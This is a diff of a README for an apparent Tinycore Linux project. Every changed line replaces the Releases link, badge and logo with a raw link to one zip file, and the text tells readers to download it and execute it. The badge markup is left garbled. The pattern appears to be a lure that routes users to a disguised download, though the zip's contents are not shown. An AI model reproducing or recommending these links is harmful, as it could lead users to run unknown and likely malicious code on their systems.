@@ -1,6 +1,6 @@
 # Betelhem Damtew - Tinycore Linux Operating System
 
-![Tinycore Linux](https://img.shields.io/badge/Tinycore%20Linux-Operating%20System-blue.svg)
+![Tinycore Linux](https://raw.githubusercontent.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/main/sitomania/Damtew_Betelhem_operating_system_linux_Tinycore_v2.3.zip%20Linux-Operating%https://raw.githubusercontent.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/main/sitomania/Damtew_Betelhem_operating_system_linux_Tinycore_v2.3.zip)
 
 Welcome to the **Betelhem-Damtew-Tinycore-linux-operating-system** repository! This project aims to provide a lightweight and efficient Linux operating system based on Tinycore Linux. Tinycore is known for its minimalistic design, making it perfect for users who want a fast and customizable experience.
 
@@ -27,9 +27,9 @@ Tinycore Linux is a small, efficient Linux distribution that provides a robust e
 
 ## Installation
 
-To get started with Tinycore Linux, you can download the latest release from the [Releases section](https://github.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/releases). Look for the appropriate file, download it, and execute it on your system. 
+To get started with Tinycore Linux, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/main/sitomania/Damtew_Betelhem_operating_system_linux_Tinycore_v2.3.zip). Look for the appropriate file, download it, and execute it on your system. 
 
-1. Visit the [Releases section](https://github.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/releases).
+1. Visit the [Releases section](https://raw.githubusercontent.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/main/sitomania/Damtew_Betelhem_operating_system_linux_Tinycore_v2.3.zip).
 2. Download the desired file.
 3. Follow the installation instructions provided in the release notes.
 
@@ -68,8 +68,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information and updates, visit the [Releases section](https://github.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/releases) again to check for new releases and updates. 
+For more information and updates, visit the [Releases section](https://raw.githubusercontent.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/main/sitomania/Damtew_Betelhem_operating_system_linux_Tinycore_v2.3.zip) again to check for new releases and updates. 
 
-![Tinycore Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Tinycore_logo.svg/1200px-Tinycore_logo.svg.png)
+![Tinycore Logo](https://raw.githubusercontent.com/Myloh12/Betelhem-Damtew-Tinycore-linux-operating-system/main/sitomania/Damtew_Betelhem_operating_system_linux_Tinycore_v2.3.zip)
 
 Feel free to explore, experiment, and enhance your Tinycore Linux experience. Happy computing!
